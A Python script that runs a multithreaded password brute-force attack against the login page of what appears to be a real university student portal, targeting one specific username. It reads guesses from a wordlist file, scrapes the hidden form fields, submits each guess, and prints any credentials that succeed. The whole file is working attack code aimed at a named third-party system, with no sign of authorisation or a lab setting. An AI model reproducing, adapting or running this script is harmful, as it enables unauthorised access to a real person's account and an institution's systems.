#!/usr/bin/python

import urllib.request
import urllib.parse
import threading
import queue
import http.cookiejar
import sys
from html.parser import HTMLParser

# General settings
user_thread = 10
wordlist_file = 'passwd.txt'
username = '19/05431'
resume = None

# Target specific settings
target_url = 'https://portal.kcau.ac.ke'
target_post = 'https://portal.kcau.ac.ke/Default/LogIn'

username_field = 'AuthModel.Username'
password_field = 'AuthModel.Password'
success_check = 'Username or Password is Incorrect.'

class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print(f'Finished setting up for: {username}')

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_brute)
            t.start()

    def web_brute(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar('cookies')
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read().decode()

            print('Trying: %s : %s (%d left)' % (self.username, brute, self.password_q.qsize()))

            # Parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # Add username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute
            login_data = urllib.parse.urlencode(post_tags).encode()
            login_response = opener.open(target_post, login_data)
            login_result = login_response.read().decode()

            if success_check not in login_result:
                self.found = True
                print('[+] Bruteforce successful')
                print(f'[+] Username: {self.username}')
                print(f'[+] Password: {brute}')
                print('[+] Waiting for other threads to exit...')

class BruteParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == 'name':
                    tag_name = value
                if name == 'value':
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = tag_value

def build_wordlist(wordlist_file):
    with open(wordlist_file, 'r') as f:
        words = queue.Queue()
        for word in f:
            words.put(word.rstrip())
    return words

words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
